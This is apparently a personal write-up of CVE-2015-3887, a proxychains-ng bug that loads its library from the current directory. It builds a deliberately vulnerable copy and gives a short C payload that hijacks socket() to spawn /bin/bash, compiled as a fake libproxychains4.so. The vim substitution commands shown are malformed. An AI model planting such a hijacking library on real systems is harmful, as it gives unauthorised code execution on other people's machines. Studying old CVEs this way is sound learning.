# CVE-2015-3887

CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.

After looking for a bit, i saw a `#define SUPER_SECURE` with a comment next to it saying "**CVE-2015-3887**", so i decided to look, and it seemed like a pretty cool exploit to me.

## Explanations

The exploit is fairly simple and straight forward, the program looks for `libproxychains4.so` in the **Current Path** of the program instead of looking in the default **libproxychains4.so** directory which is in **/usr/local/lib/libproxychains4.so**...

This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called **payload.c** into a **libproxychains4.so** :

`gcc -shared -nostdlib -o libproxychains4.so payload.c`

Next we would need to put the compiled file into the same directory where the **proxychains** binary is being ran from (`which proxychains` or `which proxychains4`).

## Exploit demo

1. Compile the program **with the ignore_cve flag on**, so the program is vulnerable.

```bash
$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the "ignore_cve" field, and change it to "yes" (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every "$(prefix)" and "$(exec_prefix)" with ".", since we only want to build proxychains in our current directory.

$ ./configure
$ make && make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
```

2. Write and Compile the exploit

We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.

After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.

Let's write the exploit :)

```c
#include <stdio.h>
#include <stdlib.h>

int socket(){
    system("/bin/bash");
    return 0;
}

```

Let's compile the exploit as a shared object

`gcc -shared -nostdlib -o libproxychains4.so payload.c`

3. Bypass the default libproxychains4.so using our exploit

Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is **libproxychains4.so** and you should get a shell...






